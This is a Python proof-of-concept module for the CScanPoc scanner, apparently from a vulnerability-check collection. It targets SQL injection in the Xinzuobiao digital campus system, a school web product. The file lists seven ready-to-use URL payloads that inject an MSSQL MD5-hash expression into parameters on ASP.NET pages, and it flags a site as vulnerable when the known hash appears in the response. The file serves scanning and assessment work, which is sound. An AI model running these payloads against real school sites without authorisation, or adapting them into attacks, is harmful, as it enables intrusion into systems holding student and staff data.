# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Xinzuobiao_0012'  # 平台漏洞编号，留空
    name = '新座标通用型数字校园系统 SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-07-21'  # 漏洞公布时间
    desc = '''
        新座标数字校园系统是由无锡新座标教育技术有限公司打造的一款为数字校园的建设与应用提供了更加广阔背景的软件。
        新座标通用型数字校园系统多处SQL注射漏洞。
        /DPMA/FWeb/SchoolWeb/Class/ClassNotic.aspx
        /dpma/FWeb/WorkRoomWeb/Web/Index.aspx
        /dpma/FWeb/WorkRoomWeb/Web/TeacherAlbums_New.aspx
        /dpma/FWeb/WorkRoomWeb/Web/TeacherBlogDetail.aspx
        /dpma/FWeb/WorkRoomWeb/WebYRY/TeacherBlog.aspx
        /DPMA/FWeb/SPEWeb/Web5/SPEVideosDetail.aspx
        /dpma/FWeb/SchoolWeb/Web/AnnounAndNews.aspx
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '新座标数字校园系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0240eca6-4571-4f0d-ac0c-ad8694b8f763'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payloads = [
                '/DPMA/FWeb/SchoolWeb/Class/ClassNotic.aspx?ClsID=4012&KindID=%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--',
                '/dpma/FWeb/WorkRoomWeb/Web/Index.aspx?TID=1%20AND%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))',
                '/dpma/FWeb/WorkRoomWeb/Web/TeacherAlbums_New.aspx?tid=1%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))',
                '/dpma/FWeb/WorkRoomWeb/Web/TeacherBlogDetail.aspx?tid=1%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))&diaryId=1000',
                '/dpma/FWeb/WorkRoomWeb/WebYRY/TeacherBlog.aspx?tid=1%20%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))',
                '/DPMA/FWeb/SPEWeb/Web5/SPEVideosDetail.aspx?KindSetID=30000&VideoID=1%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--',
                '/dpma/FWeb/SchoolWeb/Web/AnnounAndNews.aspx?Type_Anews=1&sid=1%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))&diaryId=1000'
            ]
            for payload in payloads:
                verify_url = self.target + payload
                #code, head, res, errcode, _ = curl.curl2(url)
                r = requests.get(verify_url)
                if '81dc9bdb52d04dc20036dbd8313ed055' in r.text:
                    # security_hole(verity_url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
